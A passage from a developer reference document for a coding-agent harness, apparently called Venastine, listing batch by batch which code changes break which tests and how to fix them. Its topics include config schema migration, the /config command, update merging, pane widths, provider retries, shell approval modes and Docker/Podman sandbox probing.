| Add a field to `HarnessConfig` with no key in `config.yaml` | `import config` raises `Field required` naming the field | Add the key. No schema field has a default, and that is the decision — see the row above |
| Register a tool without a field in both permission models | `tools.registry` import raises `RuntimeError` (D24), as before | The message names `ToolPermissionsModel` / `ToolApprovalsModel` in `config_schema.py` **and** the two `config.yaml` tables now. The field NAMES stayed in Python precisely so this check stays a build-time one. One deliberate exception: `shell` needs no approvals field, its approval living solely in `shell_approval_mode` |
| Carry a `tool_approvals.shell` key forward from an older file | `import config` raises `extra_forbidden` naming the key | Intended. The field was removed because every outcome it could produce is an outcome `shell_approval_mode: always` already names; set the mode instead. The npm-update merge drops the stale key as "not a setting in this version" while keeping every other edit |
| Write a bool where an int is wanted, or an int where a bool is | `import config` raises `int_type` / `bool_type` | `StrictInt` / `StrictBool`, for `config_loader._type_ok`'s reason: `bool` is a subclass of `int`, so a `true` would otherwise sail through as `1`. Floats still accept an int, so `8` is a legal way to write `8.0` |
| Duplicate a key in `config.yaml` | `import config` raises `DuplicateKeyError` | Intended. A second `shell_approval_mode` silently winning would be the worst possible last-one-wins |
| Add an environment variable that redirects `config.yaml` | `test_config_yaml_resolves_to_exactly_one_place` fails | Not a bug to fix — the test is the point. The file has ONE location because `settings.json` rejects `shell_approval_mode`, `ensemble_models`, `critic_model` and `embedder_model` by name (R12, E2, G7, SQ7) on the grounds that a project's file beats the user's; a redirect variable hands that back. The test walks `config_schema.py`'s AST and fails on any `os.environ.get` outside `HARNESS_ENV_VARS` |
| Give `OUTPUT_DIR` or `WORKSPACE_DIR_EXPLICIT` a key in `config.yaml` | `extra_forbidden` at import, and behaviour changes if you also add the field | Both are derived, deliberately. `OUTPUT_DIR` is one expression with no branch and its `AGENT_WORKSPACE` default is `"."` where `workspace_dir`'s is `"./workspace"`; a key would have to be ignored whenever `AGENT_WORKSPACE` is named. `WORKSPACE_DIR_EXPLICIT` is the variable's PRESENCE, which YAML cannot express |
| Read a config value at call time instead of at import | `test_mutating_config_after_binding_does_not_move_it` fails, or worse, nothing fails | The read happens once, in `config_schema.load()`, and the environment is folded in there. That is what makes `os.environ[...] = ...` unable to move the security posture (UN1). A call-time read follows the mutation |
| Have `config.py` import anything under `core/` | `ImportError` at startup | `core/config_loader.py` imports `config_schema`, and used to import `config`. `config_schema.py` imports the stdlib, `ruamel.yaml` and `pydantic` and nothing first-party, which is what keeps the cycle impossible rather than merely absent |
| Rename a `config.yaml` key that `_COMPACTION_DEFAULTS` names | `shipped_defaults()` raises `AttributeError`, surfacing through `initialize()` at startup | Same failure as before the migration, but the map holds schema field names rather than strings looked up on a module, and `test_every_compaction_default_names_a_schema_field` catches it in the suite instead |
| Unify the two YAML parsers | Frontmatter parsing changes under ~70 tests | `pyyaml` parses agent/skill frontmatter, where nothing is written back; `ruamel.yaml` is for the half `pyyaml` cannot do — preserving a hand-authored file's comments across a WRITE. Two parsers is the decision |
| Move a posture value and not tell `scripts/prepublish-check.mjs` | Nothing fails, which is the problem | Exactly what happened here: its `config.py` regex could not see `unsafe_no_approval: true` in the YAML and stayed green through the whole migration. There are three detectors now, and `test_the_publish_guard_is_wired_into_the_prepublish_check` asserts each one's needle |
| Drop `config.yaml` or `config_schema.py` from `package.json`'s `files` | `npm pack` ships a shim with no data; nothing starts | `files` is an allowlist and root `.py` files are listed one by one. `test_every_npm_allowlist_entry_exists` only checks the reverse direction, so this one is caught by `node scripts/prepublish-check.mjs` |
| Assert on the old Authority rejection text | Three message assertions fail | The remediation text names `config.yaml` and the lowercase key now, because that is where the value is. `tests/test_ensemble_guard.py`, `tests/test_shell.py` assert the name and the file TOGETHER, so neither half can keep pointing at a file the value has left |


---

## `/config` writes the file the suite reads (batch 84)

`/config` is the first command that CHANGES a tracked file the rest of the
suite loads at import. `config_edit.write()` writes
`config_schema.CONFIG_PATH`, and nothing in that module knows it is running
under pytest -- so a test that exercises the writer without redirecting the
path first edits the developer's checkout and passes.

`tests/test_config_edit.py` redirects with
`monkeypatch.setattr(config_schema, "CONFIG_PATH", <tmp copy>)` and closes
with `test_the_shipped_file_is_untouched`, which holds every scalar in the
live file against the model this process bound at import. Those two disagree
only if something wrote the real file mid-run, whatever the value was.

`tests/test_tui.py` takes the other route and patches `config_edit.write`
itself, because what the handler tests are about is which path a key takes,
not what lands on disk.

| Change | What breaks | Symptom / fix |
|---|---|---|
| Register a 28th slash command whose name sorts among the `c`s | Eleven panel tests in `test_tui.py` | They walk the bare-slash list by ORDINAL and `/c` by count. The numbers are measured, not derived: run the panel, read `visible`, `shown` and `border_title` at each step, and set the expectations from that. Batch 84 did exactly this when `/config` landed between `compact` and `copy` |
| Give another command a `complete` | `test_a_space_after_any_other_command_still_offers_nothing` fails for that command | Intended. The field is opt-in precisely so `"/copy last"` keeps offering nothing; adding one is a deliberate choice per command, and the test names which commands have made it |
| Post the new suggestions from inside `_complete` instead of setting `_completing` | Nothing raises. The panel opens with the right rows and is cleared a tick later | The assignment queues a `TextArea.Changed`, so a message posted from `_complete` is handled BEFORE it and then overwritten by the empty list the api-edit branch posts. Measured. The flag is what carries the intent across that gap |
| Split the argument on any whitespace rather than on a space | A line with a newline in it starts offering completions | `dispatch` partitions on a space and nothing else, so such a line is not a command line there. The panel and the shell have to agree about what a command line is |
| Change `KeyRow.values`'s wording for a closed vocabulary | `_config_value_choices` stops offering values | It splits that string on `\|`. The phrasing is generated in `config_edit.describe`, and the value offers read it back — one string, two readers, which is why `test_a_closed_vocabulary_lists_its_words` asserts the exact text |
| Add a schema field without adding its key to `config.yaml` | `test_setting_every_leaf_to_its_own_value_changes_nothing` fails alongside the import | Same fix as the batch-82 rows above: the file and the schema move together |
| Change a range in `config_schema.py` | `test_the_ranges_are_read_off_the_constraints` fails | Update the expected phrase. The description is GENERATED from the constraint, so this is the check that the generation still tracks it rather than a second copy of the number |
| Make `HARNESS_AUTHORITY_KEYS` and `config_edit.AUTHORITY_EFFECT` disagree | `test_every_authority_key_has_a_sentence` and `test_the_config_command_gates_every_posture_key` both fail | A key with no sentence is a key whose confirmation says nothing about what it permits, which is the only reason a slash command may write one at all |
| Rename `--thread`, `--provider` or `--model` | `TestTheRelaunch` fails | `main.relaunch_argv` drops and re-adds them by name, in both `--flag X` and `--flag=X` spellings. It is pure so that this is assertable without replacing the test process |


| Read `in_session` where `in_file` was meant | Nothing raises. The value written is right and the value printed beside it is the one this process started with | `KeyRow` carries both since batch 85. `in_file` is what `config.yaml` says and is what `/config` shows; `in_session` is what this process is running. The tell is that it reads correctly until someone changes two values in one sitting, which is why the regression test writes the same key twice |
| Make `pending` a plain `in_file != in_session` | Every container row reads `pending restart` from launch, and so does every environment-overridden key | A container's two representations differ by construction (a list against a frozenset) and neither can be written from here; an environment override differs because the variable won at launch and will win again. Both exclusions are the property, not tidying |
| Drop the `write()` cache clear and leave it to the stamp | Two writes inside one filesystem timestamp tick stop being visible | `max_tokens: 16000` and `18000` are the same SIZE, so mtime carries the whole comparison. The stamp is for edits made outside the session, which `write()` cannot see |


| Refresh `yours.yaml` before checking the version | Nothing raises, and the feature silently stops working | The mirror is overwritten with the file npm just replaced, so the edits are gone before the merge looks for them. 14 of the 36 tests in `test_config_update.py` go red, `test_the_mirror_is_not_refreshed_before_the_version_check` by name |
| Record `/config` writes to a journal instead of diffing the whole file | Every hand-edited container stops surviving an update | `/config` cannot write containers -- they are view-only -- while README.md sends people to the file by hand for `ensemble_models`, `domain_authority_classes` and `similarity_calibration`. A journal covers the keys that were already the easiest to re-enter |
| Replace a container node rather than going through `_place` | Six comment lines vanish from the user's `config.yaml`, silently | ruamel anchors the prose after a block sequence to that sequence's LAST INDEX, so the following section banner and its AUTHORITY note go with the node. Mutating in place does not help; measured both ways. `test_restoring_a_container_keeps_the_text_after_it` |
| Let `reconcile()` or `main()` raise | A configuration-history feature can stop the harness from starting | Rule 2 of the module, and the launcher's half of it is that `syncConfig` does not check the status. An unwritable `config.yaml` in a root-owned global prefix is an ordinary install, not a bug |
| `import config_schema` at the top of `config_update.py` | Nothing fails; every launch gets 294ms slower | Measured: 79ms bare, 373ms with the import, on a path that runs at every launch and does nothing on almost all of them. `LIVE` restates the path expression for this reason, and `test_the_two_modules_agree_about_where_the_file_is` is what keeps the two copies honest |
| Record the live file as `shipped.yaml` on an install that has already run | The user's existing edits become the baseline and are lost at the very next update | `first_run` comes from the launcher's venv stamp, read BEFORE `ensureRuntime` builds it. With no baseline the merge falls back to two-way once and then self-heals, which costs one update's changed defaults instead of a setting |
| Drop the whole merge when one value fails validation | One key the new schema tightened costs the user every edit they ever made | The walk re-applies them one at a time and drops only what fails, then the written file is validated as the bytes it will become. `test_a_value_this_version_rejects_is_dropped` and its sibling that loads the result |


| Mirror `config.yaml` from anywhere but `config_update.mirror()` | Nothing raises, and a failed merge loses the user's settings permanently | The launcher's four-line `fs.copyFileSync` was guarded only by a `version` file existing, so it ran after a merge that had deliberately left the version and mirror alone for a retry. `TestThePostSessionMirror::test_it_refuses_when_the_version_moved_under_it` |
| Record `shipped.yaml` before the write it describes | The retry after a failed write reads every changed default as a user edit and pins it forever | The baseline and the version have to move together or not at all. `test_an_unwritable_config_is_reported` asserts all three state files are untouched -- and the assertion only bites when the new version actually ships a changed default, which is why that test edits one |
| `tree[name] = value` instead of `config_edit.place` | Comments vanish from the user's file, silently, on a write reported as a one-line change | Two anchors: prose after a block SEQUENCE hangs off its last index, and prose after a scalar moves between parent comment slots 2 and 3 when the value changes shape. The second deleted an AUTHORITY warning. Both directions are pinned, and the round trip is asserted byte-identical |
| `zip(old, new)` for a line diff | 707 of 847 lines reported as changed for a one-line edit | Only correct while the document keeps its length, and it truncates at the shorter one so removals under-report. `difflib.SequenceMatcher` |
| Fold `environment_variable` and `settings_key` back into one string | `explain()` names the wrong variable and `pending` stops excluding an override | Both READ the variable's name out of that field, so a display string doing double duty breaks them. A key can have both masters -- `model_name` does |
| Compute the config-state path in JavaScript | The mirror is written where the merge does not look, with nothing failing | One flat directory also let a checkout and two npm prefixes share a mirror. Python owns the slug; `installs.json` is how the launcher finds it |
| `os.path.isdir` for the `.git` checkout guard | Rule 4 stops firing in a linked worktree or a submodule, where `.git` is a FILE | Exactly the setup a contributor uses to test the launcher, and the reconciler then rewrites a tracked file from a mirror |
| Call `load(force=True)` in a test without restoring the cache | Two of batch 85's tests fail, but only when `test_config_loader` runs first | `config_schema._cached` outlives monkeypatch's environment teardown. The conftest fixture restores it; `TestTheLoaderCacheDoesNotLeakBetweenTests` is the pair that notices |
| Claim the file tools refuse the harness install tree | Nothing fails; a security argument rests on something untrue | `PROTECTED_SEGMENTS` is `{".venastine"}`. What holds is that `write`/`edit` ship denied and the install tree is never inside a legal workspace, so a write there is approval-gated |


| Read a field's type back out of `KeyRow.values` | Nothing raises, and one schema change makes a field stop being parsed | `values` is a rendered sentence for a person. `takes_text` and `nullable` are the facts, returned by `describe()` off the annotation. A regression test for this has to feed an input the two branches DISAGREE about, or it passes under both |
| `str.capitalize()` on a sentence that is not all lowercase | `Docker` becomes `docker` and a deliberate `WITHOUT` becomes `without` | It lowercases everything after the first character. In the AUTHORITY modal those words are the content |
| Stamp `document()`'s cache before reading the file | One save lands between the stat and the read and is cached under the old stamp | The next stat matches, so the stale tree is served until the save after that. Re-stat after the read |
| Make `/config` key lookup case-sensitive again | `/config MAX_TOKENS` reports a key that plainly exists as missing | `config.py` publishes these names upper-cased and the docs quote both. Two rows differing only in case cannot exist, so there is nothing for case-sensitivity to disambiguate |

---

## The reference record moved into `docs/` (batch 89)

`tests/test_docs_consistency.py` is the only module in the suite that opens
a repository document from disk, and it did so as `os.path.join(ROOT, name)`
for all of them. Batch 89 moved ten documents into `docs/`, so the file now
carries two anchors -- `ROOT` for what stayed (`README.md`, `AGENTS.md`,
`CONFIG_ARCHITECTURE.md`, `package.json`, `pyproject.toml`,
`bin/venastine.mjs`, `providers.json.example`) and `DOCS` for what moved.

The failure is loud and immediate, which is the good case: `FileNotFoundError`
naming the joined path. The bad case is the packaging one below, where
nothing in the suite is looking.

| Change | Test | Fix |
|---|---|---|
| Move another document into or out of `docs/` | every check in `test_docs_consistency.py` that opens it | Swap `ROOT` for `DOCS` (or back) at that call site; `DOC_PATTERNS`' keys are repo-relative paths, so its entry moves too |
| Add a root-then-`docs/` fallback resolver instead | nothing -- it passes | A fallback makes a genuinely missing document look present, which is the one thing this file exists to catch. Two explicit anchors, no search |
| Move a document that `package.json`'s `files` ships | `test_every_npm_allowlist_entry_exists` | Update the allowlist entry to the new path. It ships `docs/THIRD_PARTY_NOTICES.md`, `docs/SECURITY.md` and `docs/PRIVACY.md` individually -- a bare `docs/` would put 1.8 MB of ROADMAP and DEVLOG in the tarball |
| Move `THIRD_PARTY_NOTICES.md` without updating `scripts/prepublish-check.mjs` | **nothing** | `REQUIRED` there is read by no test. It fails at `npm publish`, after which the version can never be replaced. Change both in one commit |
| Move `AGENTS.md` | `test_workspace_trust.py`, and the harness at runtime | Do not. `core/config_loader.py` reads it through `workspace_trust.PROJECT_CONTEXT_FILENAME`, and WS9 puts the root copy inside D17's trust content hash |

---

## The pane the switcher hides, and the thinking bar a replay dropped (batch 90)

`#pane` hides one `Transcript` with `display = False`, and a hidden widget
measures 0. Both panes are written while hidden -- the viewer is painted before
it is shown, and a running turn goes on writing to the live transcript while a
stored run is read -- so both measure through `Transcript._region_width`, which
borrows the on-screen sibling's width, and the `write` funnel hands RichLog the
width RichLog itself would compute with that region.
`TestTheLiveTranscriptWritesAtTheOnScreenWidth` in
`tests/test_agent_navigation.py` holds it.

**Every width pin sets `app.console.size`.** `run_test(size=)` sizes the screen
and leaves `app.console` at 80, and RichLog clamps a `width=None` write's
measurement to the console -- so in a pilot an on-screen prose row tops out at
80, two cells from the 78 floor, and the pin cannot tell the two apart.
`_size_console` is the helper.

**The code-block pins need a syntax theme with a background.** Rich pads a
Syntax row only then, and both shipped themes are transparent, so under them
the explicit-width shortcut and the real computation draw identical rows. The
class's autouse fixture patches `Transcript._syntax_theme` to `monokai`; without
it `test_a_code_block_in_the_viewer_matches_the_live_pane` passed on the unfixed
tree.

**Measure visible text, not cells, when the bound is the floor.** A committed
row keeps the space it was cut after, and that one cell carried a 78-column wrap
past `> 78`: the pin written for "pre-wrap at the floor" survived that mutation
until it read `line.text.rstrip()`.

| Change | Test | Fix |
|---|---|---|
| Remove the sibling borrow from `_region_width` | `test_what_the_main_agent_writes_while_a_run_is_open_uses_the_panel`, `test_rows_written_while_hidden_match_rows_written_on_screen`, `test_the_width_is_measured_at_write_time` | A hidden pane floors to 78 and RichLog keeps the Strips. Borrow |
| Borrow in `_wrap_width` but not in `write`, or the reverse | `test_rows_written_while_hidden_match_rows_written_on_screen` | Pre-wrapped rows and prose break at two widths. Both read `_region_width` |
| Pass the borrowed region as `width=` | `test_a_code_block_in_the_viewer_matches_the_live_pane`, the row-equality pin | An explicit width switches off shrink, so a padded renderable goes edge to edge. Keep `_borrowed_render_width` |
| Take the width once, when the viewer opens (663be29's shape) | `test_the_width_is_measured_at_write_time` | A resize with the viewer up leaves it stale. Measure per write |
| Give `#transcript` and `#thread-view` different border, padding or scrollbar settings | `test_the_panes_measure_the_same_width_when_shown` | The borrow assumes one box. Change both, or stop borrowing |
| A textual bump changes `RichLog.write`'s width computation | the row-equality pin | `_borrowed_render_width` mirrors it step for step; mirror the new one |
| Draw a thinking line without `markdown.plain_wrap` | `TestStreamedThinkingRendersLikeReplayedThinking` in `tests/test_live_output.py`, the row-equality pin | A replay's continuation rows lose the bar, and so do live rows the newline rule commits. Wrap in `_write_thinking_lines` |
| Keep `plain_wrap`'s empty remainder after a cut at the very end of a line | `test_a_space_that_overflows_ends_its_row`, the double-width thinking case | A bare bar row under every chunk committed after an overflowing space |
| Change `_plain_cut` | `TestPlainWrap` in `tests/test_markdown_render.py` | Its oracle is the pre-batch-90 `plain_split`, kept verbatim in the test. Both the streamed commit and the replayed wrap must still match it |
| Bring back a set-and-clear width override for the viewer's paint | **nothing** | Not needed -- a hidden pane measures its sibling on its own -- and two mechanisms for one width is the drift this batch removed |

`test_the_width_override_does_not_survive_the_paint` is retired: it asserted
`_paint_width is None` after a paint, and the attribute no longer exists.

---

## A provider failure: retried, recorded, and shown with its reason (batch 91)

**A model call is retried inside `_run_steps`, and the boundary is the
screen.** `core/provider_errors.is_transient` decides which failures qualify.
The loop retries a DRAINED run (`drained=True`, passed by
`run_agent_conversation` and `continue_conversation`) whatever it had
streamed, and a drawn run only before its first delta. Every retry test
patches `core.provider_errors.sleep` -- never the global `time`, AGENTS.md's
`monotonic` rule -- and `core.provider_errors.random` to 0.5, the centre of the
jitter, so a delay is exact.

**The suite cannot build a real SDK exception.** The root conftest replaces
openai, anthropic, google.genai and httpx in `sys.modules`, so
`tests/test_provider_errors.py` uses LOOKALIKES: a class named as the SDK names
it, carrying the attributes the SDK sets. The classifier reads exactly that --
MRO names, `status_code`, `code`, `body` -- and the real classes were checked
outside pytest (DEVLOG batch 91). An `isinstance` against an imported SDK class
would match nothing here and would import what `core/client.py` deliberately
does not.

**`_run` is a frame around `_run_steps`.** A test driving `_run` still drives
the loop, and `test_grants.py`'s AST walk still finds exactly one `_run`. A
memory double must now answer `mark_turn_failed`: `FakeMemory` does, and a
hand-rolled double without it logs "Could not record this run's failure" while
the original exception still propagates.

**`MessageLog.error` rides the neutral shape ONLY when set**, on §44's terms
for `thinking`. `FakeStorage._reconstruct` mirrors it, and
`MEMORY_STORAGE_SYMBOLS` names `mark_turn_failed`.

| Change | Test | Fix |
|---|---|---|
| Classify by HTTP status alone, ignoring an open stream's error body | `test_not_retried[...]` in `test_provider_errors.py` | A mid-stream `APIError` naming a 4xx, and anthropic's 200-status error types, are read from `body` |
| Trust an int `code` on any exception | `test_not_retried[an unrelated exception with an int code]` | Only on something named `APIError` (google-genai) |
| Let a retry-after shorten the wait | `test_a_retry_after_cannot_shorten_it` | `max(delay, retry_after)` -- the owner asked for longer waits, not shorter |
| Retry a permanent failure | `test_a_permanent_failure_raises_at_once` | Keep `is_transient` in the retry condition |
| Retry a drawn run after it showed output | `test_a_drawn_run_that_already_showed_output_is_not_retried` | A transcript row cannot be taken back (TECHNICAL_DEBT 25) |
| Drop `drained=True` from a draining wrapper | `test_the_two_draining_wrappers_say_so` | A subagent failing mid-reasoning would never be retried |
| Record a failure on `BaseException` | `test_an_abandoned_generator_is_not_a_failure` | `GeneratorExit` is #42's quit, not a failed run |
| Store `describe(e)` unredacted | `test_a_secret_in_the_failure_is_redacted_before_it_is_stored` | `redact_secrets` before `mark_turn_failed` |
| Hand a user message dict to the wire whole | `test_the_wire_shape_is_identical_with_or_without_it` | Build a user row's request from `content` alone |
| Mark the oldest user row, always emit `error`, or drop it from `_ordered_rows` | `test_a_failed_run_is_recorded_on_the_user_row_that_started_it` (real SQLite) | Newest by `(created_at, id)`; present in the neutral shape only when set |
| Drop the replay entry | `test_a_failed_run_ends_with_why`, `test_a_failure_sits_under_the_turn_it_belongs_to` | An `error` entry right after its user entry |
| Post the handler's line unredacted, or without the exception | `test_a_routed_line_is_redacted_like_the_log_file`, `test_a_routed_error_carries_its_exceptions_reason` in `test_tui.py` | `redact_secrets` over the whole line; the reason appended from `exc_info` |
| Add a `config.yaml` key | `test_setting_every_leaf_to_its_own_value_changes_nothing` | Update its pinned count (115 since this batch) |

**A focused run can fail for order alone.** `test_storage_e2e.py`'s
module-scoped `real_storage` re-imports `config` against a throwaway database,
so naming it BEFORE `test_config_edit.py` on one command line fails four
`db_path` pins there. The full suite's alphabetical order does not; it is an
artefact of the command line, not a regression.

---

## Code in the sandbox asks under `tiered`; the old rule is `contained` (batch 92)

**`tiered` now approves INERT alone** (ROADMAP_v2 §48, CE1). Any test that
asserted `_asks(<non-inert command>, docker=True) is False` under the shipped
posture pinned G4's rule, and that rule is now the `contained` mode's. Those
tests were MOVED, not deleted: they set
`set_posture(monkeypatch, shell_approval_mode="contained")`, and where the
friction they measured changed, they assert the `tiered` answer beside it.
That is the pattern for any future test of the same shape -- decide which mode
the claim is about and say so, rather than relying on the conftest default.

**`CommandProfile` has a required `runs_code` field** (CE7), with no default.
A test constructing one must pass it, or it raises `TypeError` -- which
`test_it_is_required` pins on purpose.

**The mode vocabulary is four words.** `APPROVAL_MODES`, `ShellApprovalMode`
and the `/config` completer's `always | tiered | contained | never` all moved
together; a test pinning the old three-word tuple is pinning the wrong set.
The full suite found two more copies the focused runs did not reach, both in
`tests/test_tui.py::TestTheConfigPanelIsTheCommandPanel`
(`test_a_closed_vocabulary_is_offered_as_values` and
`test_tab_completes_a_key_and_then_offers_its_values`): the panel offers the
Literal's words in schema order, so `contained` sits between `tiered` and
`never` there too.

**The SANDBOXED reason string changed**, and `tests/test_tui.py`'s `_NOTICE`
sizing constant moved with it: it sizes modals from what the gate actually
says, so a stale copy would size them from a string that no longer exists.

| Change | Test | Fix |
|---|---|---|
| Name an interpreter list instead of `runs_code` | `test_no_language_is_listed_so_none_can_be_missed` | Everything not INERT runs code; `zzlang abc` must ask |
| Drop `runs_code` from `auto_approved`'s CONTAINED branch | `test_it_asks_with_docker_up`, `test_it_alone_decides_a_contained_answer` | `not (network or runs_code)` |
| Set `runs_code=False` on a SANDBOXED profile | `test_every_producer_states_it`, `test_it_asks_with_docker_up` | Only INERT and HOST_READ are False |
| Apply the `contained` override in every mode | `test_it_asks_with_docker_up` | Guard on `mode == CONTAINED_MODE` |
| Let the override ignore `network` | `test_a_network_command_still_asks` | `not profile.network` in the override |
| Put the override above the protected-segment check | `test_a_literal_protected_segment_still_asks` | Step 4 sits below step 2 |
| Let the override cover an unmeasured call, or the host fallback | `test_an_unmeasured_call_is_not_argued_through`, `test_the_host_fallback_is_not_the_container` | `profile.measured` and `containment == CONTAINED` |
| Restrict the fallback opt-in to one mode | `test_code_on_the_host_fallback[tiered-False]` | CE5: honoured under `tiered` and `contained` |
| Report "host shell, no ask" under `always` | `test_under_always_the_fallback_pair_is_not_no_ask`, `test_the_badge_says_no_ask_exactly_when_the_gate_does_not_ask` | CE6: the badge follows the gate |
| Leave `contained` off the badge | `test_contained_is_reported_and_says_what_still_asks` | CE4 |
| Drop `contained` from the vocabulary | `test_the_shipped_default_is_tiered`, `test_a_closed_vocabulary_lists_its_words` | All three spellings of the set move together |

**Moved to `contained`:** `test_docker_no_approval` (now
`test_docker_code_asks_under_tiered` beside `test_docker_no_approval_under_contained`),
`test_a_contained_command_without_network_is_not`, and in both
`TestQuotingCannotHideAnEscape` and `TestBackslashCannotHideAnEscape`:
`test_and_with_docker_up_it_is_simply_contained` and
`test_a_legitimate_*_workspace_path_still_works`.

---

## Podman runs the sandbox when Docker cannot; a third record document (batch 93)

**The runtime probe is no longer an `lru_cache` on `is_docker_available`**
(ROADMAP_v3 §49, SS22). `security/sandbox._probe()` memoises a `RuntimeProbe`
(which CLI answered, and why none did) under a lock, and `is_docker_available()`
is now `container_runtime() is not None`. A test that reset the probe with
`is_docker_available.cache_clear()` must call `sandbox._reset_runtime_probe()`
instead: there is no `cache_clear` attribute, so a `getattr` fallback silently
leaves the previous test's answer in place. `TestDockerAvailable`'s fixture moved.

**The route's CLI comes from `known_runtime()`, which never probes.** A test
that patches `is_docker_available` or passes `docker_available=True` gets
Docker's argv exactly as before. To exercise Podman, set
`sandbox._runtime_probe = sandbox.RuntimeProbe("podman")` with `monkeypatch`;
do NOT let a test run the real probe, because GitHub's ubuntu runners ship
Podman and the argv would differ between CI and a local run.

**Three strings moved.** The posture's fallback detail says "if no container
runtime (Docker or Podman) can run the sandbox" (`tests/test_posture.py`'s two
`"if Docker is"` pins), the unavailable error starts "No container runtime"
(`test_non_inert_no_docker_fallback_disabled_raises`), and the approval notice
says "Runs in a Docker container" or "Runs in a Podman container" by the probe
-- `tests/test_tui.py`'s `_NOTICE` is unchanged because an unprobed test reads
Docker.

**The shipped image is `docker.io/library/python:3.13-slim`** (SS23), so
`DOCUMENTED_CEILINGS`' README row template in `tests/test_docs_consistency.py`
moved with it.

**`ROADMAP_v3.md` is part of the record** (SS21). `_RECORD_DOCS` names it, so an
id defined there resolves for production citations, and the AGENTS.md map line
must claim `SS1–SS24` or `test_the_map_names_every_family_the_record_defines`
fails. Its index has its own coverage and marker tests, because the v2 checks
read `ROADMAP_v2.md` by name and v3's bold row spelling never matched
`_INDEX_ENTRY`. **Its facts are a bullet list, not a table with ids in the first
column:** `_DEFINITION_ROW` reads any `| X1 |` row as a decision, so a facts
table keyed `F1`… would define a family the map does not name.

| Change | Test | Fix |
|---|---|---|
| Probe Podman first, or whenever it is installed | `test_docker_wins_whenever_it_answers` | Docker first; Podman only when Docker is missing or does not answer |
| Use a Podman that cannot enforce the limits | `test_a_podman_that_cannot_enforce_the_limits_is_refused[*]` | SS24: rootless needs cgroups v2 and cpu/memory/pids delegated |
| Treat an unreadable `podman info` as capable | `test_a_podman_that_cannot_enforce_the_limits_is_refused[*could not be read*]` | Fail closed |
| Refuse a rootful Podman on cgroups v1 | `test_a_rootful_podman_is_trusted_on_either_cgroup_version` | Only rootless can fail |
| Skip the check for a `docker` that is really Podman | `test_a_docker_that_is_really_podman_is_checked_as_podman` | `buildahVersion` in `info` means Podman |
| Probe per call, or without the lock | `test_the_podman_path_probes_once_per_process`, `test_the_probe_runs_once_per_process` | One `_probe()` per process |
| Let `known_runtime()` probe | `test_known_runtime_reads_the_probe_and_never_runs_it` | Read `_runtime_probe`, default Docker |
| Hard-code `docker` in the argv, the kill or the image inspect | `test_the_route_invokes_the_runtime_the_probe_found`, `test_a_timed_out_podman_container_is_killed_by_podman`, `test_the_image_is_inspected_by_the_runtime_that_runs_it` | Thread `runtime` from `known_runtime()` |
| Drop the probe's reason from the unavailable error | `test_the_unavailable_message_carries_the_probes_reason` | `_known_unavailable_reason()` in the message |
| Name Docker in the notice whatever runs | `test_the_approval_notice_names_the_runtime` | `known_runtime().capitalize()` |
| Ship the short image name | `test_the_shipped_image_is_fully_qualified` | SS23 |
| Add a §N to ROADMAP_v3 without an index row, or a row without a marker | `test_the_roadmap_v3_index_covers_every_section`, `test_every_roadmap_v3_index_entry_carries_a_status_marker` | One marked row per section |

---

## Background sessions, the foundations: pattern engine, wake row, backends, manager, wake builder (batch 94)

ROADMAP_v3 §49, slice 1, commits 1-5. Nothing here is reachable from a tool yet; the pins move because
shared shapes did.

**`MessageLog` has a `harness` column, and `save_message` a `harness=` argument.** FakeStorage's
`save_message` and `_reconstruct` mirror both (`tests/test_fake_storage_mirror.py` holds them to
`storage._to_neutral`), and its rows carry a `"harness"` key. A test building a FakeStorage row by hand
does not need the key -- `_reconstruct` reads it with `.get` -- but a test comparing a reconstructed
harness row must expect `"harness"` in the neutral shape.

**`wake` is a transcript role.** It is in `META_ROLES`, so `/copy conversation` leaves it out, and in
both inventories in `tests/test_themes.py`: `MESSAGE_ROLES` (the distinctness and `dim` checks) and
`EXPECTED_ROLE_KEYS` (every theme fills every slot). A theme test pinning the old role set is pinning
the wrong set.

**Five config keys** (`shell_session_*`) sit after `sandbox_max_pids`, in the schema and in
`config.yaml` in the same order. `test_setting_every_leaf_to_its_own_value_changes_nothing` counts 120
settable scalars now, where it counted 115.

**`_run_docker` builds its argv through `_docker_argv`, and every container carries
`--label venastine.process=<PROCESS_TOKEN>`** -- one-shot runs too. A test asserting the FIRST label is
unaffected; a test asserting the whole argv must include the process label, and
`test_the_golden_one_shot_argv` is the one that does.

**`run_sandboxed` routes through `_route`.** A test that patches `_run_docker`, `_run_inert` or
`_run_subprocess_fallback` and asserts which was called is unchanged; `_route` is what decides, and
`TestTheRouteIsTheContainmentTheGateAssumed` holds it to `containment_for`.

**`_unix_resource_limits` takes `cpu_seconds=`**, defaulting to `SANDBOX_CPU_SECONDS`, and `_run_inert`
splits its argv with `_inert_argv`, which a host session shares.

**`run_agent_conversation`'s prompt is built by `RunAgentLoop._conversation_prompt`**, unchanged, and
shared with `wake_conversation`. A test patching `with_goal`, `with_memories`, `with_refs` or
`with_todos` in `core.loop` still reaches them.

**The session tests that start threads bound every wait.** A mutation that strands a waiter fails
rather than hanging -- but `pytest-timeout` is not installed, so a wait written without a bound would
hang the suite. `tests/test_shell_sessions.py`'s `_until` and `WAIT` are the pattern.

| Change | Test | Fix |
|---|---|---|
| Compile monitor patterns with RE2's error logging on | `test_a_refused_pattern_writes_nothing_to_stderr` | `options.log_errors = False` |
| Accept a `re2` from another distribution or path | `test_a_re2_module_from_another_distribution_is_refused`, `test_a_re2_module_at_another_path_is_refused` | Locate google-re2's own `re2/__init__.py` |
| Import `re2` anywhere but `core/line_pattern.py` | `test_only_this_module_imports_re2` | One importer, three guards |
| Drop the harness mark on write or read | `test_a_harness_row_survives_a_write_and_a_read`, `test_the_mark_comes_back_only_when_the_row_has_one`, the mirror test | `save_message(harness=)` and `_decode_harness` |
| Put a `tool_call_id` on a harness row | `test_a_harness_row_survives_a_write_and_a_read` | Never -- `pinned_through` reads it as answered |
| Replay a harness row under `you ›`, or summarise it as `user:` | `test_a_harness_row_replays_as_a_wake_header`, `test_a_harness_row_is_labelled_harness` | M8's rule |
| Let a wake line keep the reply label | `test_a_wake_line_retires_the_reply_label` | It opens a turn, like `user` |
| Give a session a container without `--sig-proxy=false`, the in-container timeout or the process label | `test_the_session_argv`, `test_the_golden_one_shot_argv` | `_docker_argv(session_timeout_s=)` |
| Let a session inherit stdin, or share the console's signal group | `test_no_stdin_and_one_merged_output_stream`, `test_the_process_is_out_of_the_consoles_signal_group` | `_popen_session` |
| Route a session differently from `containment_for` | `test_route_and_containment_for_agree` | One `_route` |
| Kill a host session's shell but not its group | `test_a_host_session_on_posix_gets_term_then_kill_as_a_group` | `os.killpg` |
